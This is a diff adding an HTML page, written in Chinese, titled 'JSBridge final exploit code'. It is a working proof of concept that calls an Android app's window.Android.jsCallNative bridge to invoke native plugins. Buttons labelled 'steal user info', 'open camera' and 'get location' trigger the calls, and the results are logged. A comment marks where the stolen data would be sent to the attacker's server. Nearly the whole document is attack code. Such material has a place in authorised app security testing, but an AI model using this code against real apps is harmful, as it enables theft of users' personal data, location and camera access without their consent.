@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>JSBridge 最终利用代码</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; }
+        button { display: block; width: 100%; padding: 12px; margin: 8px 0; font-size: 16px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 4px; }
+        button:hover { background-color: #0056b3; }
+        #log { margin-top: 20px; padding: 10px; background: #f5f5f5; border-radius: 4px; white-space: pre-wrap; font-size: 14px; }
+        .success { color: #4CAF50; }
+        .error { color: #f44336; }
+    </style>
+    <script src="https://unpkg.com/vconsole@latest/dist/vconsole.min.js"></script>
+</head>
+<body>
+    <h1>JSBridge 最终利用代码</h1>
+    <button onclick="testGetUserInfo()">窃取用户信息</button>
+    <button onclick="testOpenCamera()">打开相机</button>
+    <button onclick="testGetLocation()">获取位置</button>
+    <button onclick="clearLog()">清空日志</button>
+
+    <div id="log">等待操作...</div>
+
+    <script>
+        new VConsole();
+        const logEl = document.getElementById('log');
+        function log(msg, type = 'info') {
+            const time = new Date().toLocaleTimeString();
+            const className = type === 'success' ? 'success' : type === 'error' ? 'error' : '';
+            logEl.innerHTML += `<div class="${className}">[${time}] ${msg}</div>`;
+        }
+        function clearLog() { logEl.innerHTML = '日志已清空\n'; }
+
+        // 【核心】定义全局回调函数，原生代码会通过名字调用它们
+        function handleUserInfo(data) {
+            log('🎉 回调 handleUserInfo 成功!', 'success');
+            log(`窃取到的用户信息: ${JSON.stringify(data)}`, 'success');
+            // 在这里将数据发送到你的服务器
+        }
+        function handleCameraResult(data) {
+            log('🎉 回调 handleCameraResult 成功!', 'success');
+            log(`相机操作结果: ${JSON.stringify(data)}`, 'success');
+        }
+        function handleLocationResult(data) {
+            log('🎉 回调 handleLocationResult 成功!', 'success');
+            log(`位置信息: ${JSON.stringify(data)}`, 'success');
+        }
+
+        // 【核心】调用 PLUTO/IRS 插件的通用函数
+        function callPlutoPlugin(pluginName, params, callbackName) {
+            if (!window.Android || !window.Android.jsCallNative) {
+                log('❌ window.Android.jsCallNative 不存在', 'error');
+                return;
+            }
+            log(`--- 调用 PLUTO 插件: ${pluginName} ---`);
+            try {
+                const payload = {
+                    method: pluginName,
+                    data: params
+                };
+                window.Android.jsCallNative(JSON.stringify(payload), callbackName);
+                log('✅ 已发起调用，等待回调...');
+            } catch (e) {
+                log(`❌ 调用失败: ${e.message}`, 'error');
+            }
+        }
+
+        function testGetUserInfo() {
+            clearLog();
+            // getUserInfo 是 PLUTO 插件
+            callPlutoPlugin('getUserInfo', {}, 'handleUserInfo');
+        }
+
+        function testOpenCamera() {
+            clearLog();
+            // openCamera 是 IRS 插件
+            callPlutoPlugin('openCamera', {}, 'handleCameraResult');
+        }
+
+        function testGetLocation() {
+            clearLog();
+            // location 是 PLUTO 插件
+            callPlutoPlugin('location', {}, 'handleLocationResult');
+        }
+
+        window.onload = () => {
+            log('页面加载完成，点击按钮开始攻击');
+        };
+    </script>
+</body>
+</html>
